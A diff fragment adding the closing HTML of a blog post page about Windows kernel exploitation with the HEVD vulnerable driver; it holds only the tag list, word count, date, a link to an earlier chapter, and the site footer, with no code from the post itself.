+					<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg><span class="tag"><a href="https://mdanilor.github.io/tags/windows">windows</a></span><span class="tag"><a href="https://mdanilor.github.io/tags/kernel">kernel</a></span><span class="tag"><a href="https://mdanilor.github.io/tags/exploit">exploit</a></span><span class="tag"><a href="https://mdanilor.github.io/tags/stack">stack</a></span><span class="tag"><a href="https://mdanilor.github.io/tags/overflow">overflow</a></span><span class="tag"><a href="https://mdanilor.github.io/tags/hevd">hevd</a></span><span class="tag"><a href="https://mdanilor.github.io/tags/hevd">HEVD</a></span><span class="tag"><a href="https://mdanilor.github.io/tags/hacksys">hacksys</a></span><span class="tag"><a href="https://mdanilor.github.io/tags/extreme">extreme</a></span><span class="tag"><a href="https://mdanilor.github.io/tags/vulnerable">vulnerable</a></span><span class="tag"><a href="https://mdanilor.github.io/tags/driver">driver</a></span><span class="tag"><a href="https://mdanilor.github.io/tags/exploitation">exploitation</a></span><span class="tag"><a href="https://mdanilor.github.io/tags/smep">smep</a></span><span class="tag"><a href="https://mdanilor.github.io/tags/kpti">kpti</a></span><span class="tag"><a href="https://mdanilor.github.io/tags/bypass">bypass</a></span>
+				</p>
+				<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg>2620 Words</p>
+				<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>2023-01-08 10:08 -0300</p>
+			</footer>
+		</article>
+		<div class="post-nav thin">
+			<a class="prev-post" href="https://mdanilor.github.io/posts/hevd-3/">
+				<span class="post-nav-label">Older&nbsp;<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-arrow-right"><line x1="5" y1="12" x2="19" y2="12"></line><polyline points="12 5 19 12 12 19"></polyline></svg></span><br><span>[Cracking Windows Kernel with HEVD] Chapter 3: Can we rop our way into triggering our shellcode?</span>
+			</a>
+		</div>
+		<div id="comments" class="thin">
+</div>
+	</main>
+
+	<footer id="site-footer" class="section-inner thin animated fadeIn faster">
+		<p>&copy; 2023 <a href="https://mdanilor.github.io">Danilo &#34;mdanilor&#34; Rodrigues</a> &#183; <a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></p>
+		<p>
+			Made with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> &#183; Theme <a href="https://github.com/Track3/hermit" target="_blank" rel="noopener">Hermit</a> &#183; <a href="https://mdanilor.github.io/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a>
+		</p>
+	</footer>
+
+
+
+	<script src="https://mdanilor.github.io/js/bundle.min.4a9a0ac3d2217822c7865b4161e6c2a71de1d70492264337755427898dd718f6.js" integrity="sha256-SpoKw9IheCLHhltBYebCpx3h1wSSJkM3dVQniY3XGPY=" crossorigin="anonymous"></script>
+	
+
+</body>
+
+</html>
